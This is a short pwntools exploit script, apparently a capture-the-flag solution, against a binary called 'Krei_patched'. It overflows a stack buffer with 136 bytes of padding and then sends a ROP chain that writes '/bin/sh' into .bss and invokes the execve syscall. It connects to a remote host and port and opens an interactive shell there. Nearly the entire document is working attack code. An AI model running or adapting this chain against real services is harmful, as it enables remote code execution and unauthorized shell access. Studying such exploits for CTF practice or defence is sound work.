from pwn import *

"""
0x000000000040119a : mov rbp, rsp ; mov qword ptr [rdi], rsi ; nop ; pop rbp ; ret
0x00000000004011ee : mov rax, rdx ; nop ; pop rbp ; ret
"""
elf = context.binary = ELF('./Krei_patched')

syscall = 0x000000000040121f
pop_rdi = 0x0000000000401216
pop_rdx = 0x00000000004011e5
pop_rsi = 0x00000000004011bb
mov_rdi_rsi = 0x000000000040119a - 1
mov_rax_rdx = 0x00000000004011ea
bss = elf.bss(0x30)

NC = "nc 103.152.242.235 5555".split()
# r = process("./Krei_patched")
r = remote(NC[1],NC[2])

# gdb.attach(r)
# pause()

payload = b'a'*136
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi) + b"/bin/sh\x00"
payload += p64(mov_rdi_rsi)
payload += p64(pop_rdx) + p64(0x3b)
payload += p64(mov_rax_rdx)
payload += p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)

r.sendline(payload)

r.interactive()